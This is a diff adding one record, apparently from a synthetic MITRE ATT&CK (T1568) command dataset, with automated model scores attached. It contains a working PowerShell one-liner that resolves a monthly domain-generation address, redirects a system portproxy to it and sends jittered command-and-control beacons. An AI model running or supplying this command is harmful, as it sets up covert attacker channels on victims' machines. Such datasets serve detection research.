@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$base='edge'+(Get-Date -Format 'yyyyMM')+'.cc';$port=4433;for($i=0;$i -lt 3;$i++){try{$answers=Resolve-DnsName $base -Type A -ErrorAction Stop;$ip=($answers|Get-Random).IPAddress;netsh interface portproxy set v4tov4 listenaddress=0.0.0.0 listenport=$port connectaddress=$ip connectport=443;Invoke-WebRequest -Uri ('http://127.0.0.1:'+ $port +'/hb') -UseBasicParsing -Headers @{Dom=$base;Tip=$ip} -TimeoutSec 5;Start-Sleep -Seconds (Get-Random -Min 20 -Max 57)}catch{Start-Sleep -Seconds 7}}",
+  "explanation": "Continuously re-resolves a monthly DGA domain and updates a system-wide portproxy listener to whichever IP is currently active, beaconing with jitter to reduce detection.",
+  "rationale_steps": [
+    "Use periodic re-resolution with randomized selection among A records.",
+    "Keep portproxy synchronized with the dynamic endpoint to sustain C2 communication."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-4fdd61a2",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid cmdlets/parameters, and proper separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It aligns with T1568 by generating a monthly DGA domain and repeatedly resolving/rotating A records with jittered beaconing, but using netsh portproxy requires admin privileges and the three-iteration loop limits persistence, reducing operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:44:31.835032Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced parentheses, proper string concatenation, valid for-loop syntax, correct try/catch blocks, and all cmdlet arguments are syntactically valid.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by constructing a monthly-rotating DGA domain, resolving it via DNS, randomly selecting an active IP (fast-flux behavior), updating a system portproxy to redirect traffic, and beaconing with randomized jitter—all fully aligned with the described technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:25:19.162380Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell script is well-structured with correct syntax for variables, loops, exception handling, and cmdlet usage.",
+        "semantic_score": 4,
+        "semantic_justification": "The script effectively implements a monthly DGA and beaconing jitter, but the netsh interface portproxy command requires administrative privileges which contradicts the 'None' privilege level specified.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:25:22.939425Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
